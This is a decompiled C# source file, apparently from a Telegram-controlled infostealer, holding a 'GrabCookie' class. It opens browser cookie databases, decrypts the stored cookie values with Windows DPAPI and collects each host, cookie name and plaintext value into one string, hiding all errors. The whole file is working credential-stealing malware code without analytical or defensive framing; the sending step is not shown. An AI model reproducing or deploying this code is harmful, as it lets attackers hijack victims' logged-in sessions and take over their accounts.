using System;
using System.Data;
using System.Data.SQLite;
using System.IO;
using System.Security.Cryptography;
using System.Text;

namespace TelegramBot
{
	// Token: 0x020000E2 RID: 226
	public class GrabCookie
	{
		// Token: 0x060002E1 RID: 737 RVA: 0x0002170C File Offset: 0x0001F90C
		private static byte[] GetBytes(SQLiteDataReader reader, int columnIndex)
		{
			byte[] result;
			using (MemoryStream memoryStream = new MemoryStream())
			{
				long num = 0L;
				byte[] array = new byte[2048];
				long bytes;
				while ((bytes = reader.GetBytes(columnIndex, num, array, 0, array.Length)) > 0L)
				{
					memoryStream.Write(array, 0, (int)bytes);
					num += bytes;
				}
				result = memoryStream.ToArray();
			}
			return result;
		}

		// Token: 0x060002E2 RID: 738 RVA: 0x00021778 File Offset: 0x0001F978
		public static string FindAllCookie()
		{
			StringBuilder stringBuilder = new StringBuilder();
			for (int i = 0; i < SearchCookie.GetLogins.Count; i++)
			{
				try
				{
					using (SQLiteConnection sqliteConnection = new SQLiteConnection("Data Source=" + SearchCookie.GetLogins[i] + ";pooling=false"))
					{
						sqliteConnection.Open();
						using (SQLiteCommand sqliteCommand = new SQLiteCommand(GrabCookie.CommandText, sqliteConnection))
						{
							sqliteCommand.CommandType = CommandType.Text;
							using (SQLiteDataReader sqliteDataReader = sqliteCommand.ExecuteReader())
							{
								while (sqliteDataReader.Read())
								{
									byte[] bytes = ProtectedData.Unprotect((byte[])sqliteDataReader[1], null, DataProtectionScope.CurrentUser);
									string @string = Encoding.ASCII.GetString(bytes);
									if (!stringBuilder.ToString().Contains(@string))
									{
										stringBuilder.Append(string.Concat(new string[]
										{
											"\n",
											sqliteDataReader.GetString(2),
											"  |  ",
											sqliteDataReader.GetString(0),
											" : ",
											@string,
											"\n\n"
										}));
									}
								}
							}
						}
					}
				}
				catch
				{
				}
			}
			return stringBuilder.ToString();
		}

		// Token: 0x04000517 RID: 1303
		private static readonly string CommandText = "SELECT name,encrypted_value,host_key FROM cookies";
	}
}
